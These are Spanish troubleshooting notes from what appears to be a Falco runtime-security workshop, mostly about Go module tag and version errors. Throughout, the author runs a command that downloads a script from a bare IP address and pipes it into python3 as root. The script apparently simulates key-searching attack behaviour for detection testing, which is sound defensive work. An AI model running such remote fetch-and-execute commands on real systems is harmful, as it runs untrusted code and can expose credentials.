# Con Workshop

root@pho3nix:/home/diegoall# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Error al ejecutar el comando de Golang: Command '['go', 'run', 'github.com/diego-all/falco-workshop@v0.1', 'init', '--vector', 'A']' returned non-zero exit status 1.
Salida de error:
go: github.com/diego-all/falco-workshop@v0.1: no matching versions for query "v0.1"





# Con Genotype

Tener en cuenta que no tiene tag, le debe apuntar a main y todo esta en otra rama.


root@pho3nix:/home/diegoall/FALCO/falco-workshop# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Error al ejecutar el comando de Golang: Command '['go', 'run', 'github.com/diego-all/falco-workshop@v0.1', 'init', '--vector', 'A']' returned non-zero exit status 1.
Salida de error:
go: github.com/diego-all/falco-workshop@v0.1: no matching versions for query "v0.1"

root@pho3nix:/home/diegoall/FALCO/falco-workshop# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Error al ejecutar el comando de Golang: Command '['go', 'run', 'github.com/diego-all/run-from-gh@latest', 'init', '--db', 'postgres', '--config', '/home/diegoall/MAESTRIA_ING/CLI/run-from-gh/inputs/config.json', 'projectTest']' returned non-zero exit status 1.
Salida de error:
Error: unknown flag: --config
Usage:
  my-cli-app init [nombre del proyecto] [flags]

Flags:
  -d, --db string   Tipo de base de datos (requerido)
  -h, --help        help for init

exit status 1


# CAUSAS

- quizas sea el modulo? habia funcionado con un script de hola mundo
- Interprete de Go ? no creo
- quizas el tag?
- lanzarlo local si genera problemas debe ser por ejecutarlo con python.
- hola amigo, tenía ese mismo error para Windows 10 y lo que hice fue desinstalar el python y volverlo a instalar como administrador teniendo en cuenta que se seleccione en el wizard que este para todos los usuarios y listo, todo solucionado.

AL parecer no es python por que si ejecuto el coquito.


root@pho3nix:/home/diegoall/FALCO/falco-workshop# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Salida estándar:
Hola Diego

Salida de error:


## prueba en servidor GCP go1.19.8

Si es necesaria una version compatible de Golang


root@draios:~# go version
go version go1.19.8 linux/amd64
root@draios:~# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Error al ejecutar el comando de Golang: Command '['go', 'run', 'github.com/diego-all/bridge-exe@v0.1.1', 'init', '--name', 'Diego']' returned non-zero exit status 1.
Salida de error:
go: downloading github.com/diego-all/bridge-exe v0.1.1
go: github.com/diego-all/bridge-exe@v0.1.1 (in github.com/diego-all/bridge-exe@v0.1.1): go.mod:3: invalid go version '1.22.1': must match format 1.23


# Probar enviando el archivo compilado haber si llora por el compilador o algo asi



Ahora bien, cuando me pego de la version v0.1.2 que tiene modulo con golang 1.18 soilicita instalar las dependencias en la primera iteracion.

root@draios:~# curl -sL http://34.27.180.215/sitio/vuelta.txt | python3
Salida estándar:
Hola Diego

Salida de error:
go: downloading github.com/diego-all/bridge-exe v0.1.2
go: downloading github.com/spf13/cobra v1.8.1
go: downloading github.com/spf13/pflag v1.0.5



YA FUNCIONA!! SIEMPRE ES UN TEMA DE SACAR TAG.

GENERALMENTE APUNTA A LATEST.  PERO A VECES PONE PROBLEMA TRAS UN COMMIT, SE SUGIERE SACAR VERSION POR QUE BUSCA UNA VERSION ANTIGUA.

HASTA ANTES DE LAS 11 SE QUEDABA PEGADO EN SCRIPT DE PYTHON, PERO LEVANTA LOS DOS COMPORTAMIENTOS DE BUSCAR LLAVES.




